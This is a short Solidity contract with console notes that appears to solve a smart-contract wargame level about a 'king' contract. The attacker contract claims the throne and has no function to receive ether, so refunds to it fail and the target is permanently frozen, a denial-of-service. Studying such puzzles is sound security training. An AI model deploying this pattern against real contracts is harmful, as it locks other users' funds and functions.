// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForeverKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }
}

//
// await contract.prize().then(v => v.toString())
//
// contract.address
//
// call claimKingship with a "contract.address" parameter and set a value of "await contract.prize().then(v => v.toString())" 1000000000000000 wei (0.00001 eth)
//
